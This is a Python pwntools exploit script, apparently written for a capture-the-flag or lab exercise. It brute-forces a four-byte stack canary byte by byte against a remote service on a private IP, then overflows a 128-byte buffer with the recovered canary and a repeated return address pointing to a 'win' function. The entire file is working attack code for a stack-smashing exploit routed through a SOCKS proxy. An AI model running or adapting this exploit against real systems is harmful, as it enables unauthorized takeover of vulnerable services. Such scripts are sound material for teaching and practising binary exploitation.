from pwn import *  # Import lib to use the APIs, just like any Python lib
# Suppress non-error messages, i.e. less verbose runtime output
context.log_level = 'error'
context.proxy = (socks.SOCKS5, 'localhost', 8123)

canary = ['\x00', '\x00', '\x00', '\x00']

def attack_byte(byteIndex):
    for guess in range(0, 256):
        conn = remote('192.168.2.83', 2014)
        # get rid of welcome messages
        conn.sendline("")
        conn.readline()
        conn.readline()

        b = bytes([guess])
        padding = ('A' * 128).encode()
        for i in range(byteIndex):
            padding += canary[i]
        conn.send(padding + b)
        response = conn.recvall()
        if "hacker" in response.decode():
            continue
        canary[byteIndex] = b
        print(response)
        print(canary)
        break

def attack():
    conn = remote('192.168.2.83', 2014)
    # get rid of welcome messages
    conn.sendline("")
    conn.readline()
    conn.readline()
    # 0x080486c6 - address of win
    attack_message = ('A' * 128).encode() + b"cd41" + b"\xc6\x86\x04\x08" * 4
    conn.send(attack_message)
    response = conn.recvall()
    print(response)

if __name__ == "__main__":
    # for i in range(4):
    #     attack_byte(i)
    # canary = [b'c', b'd', b'4', b'1']
    attack()
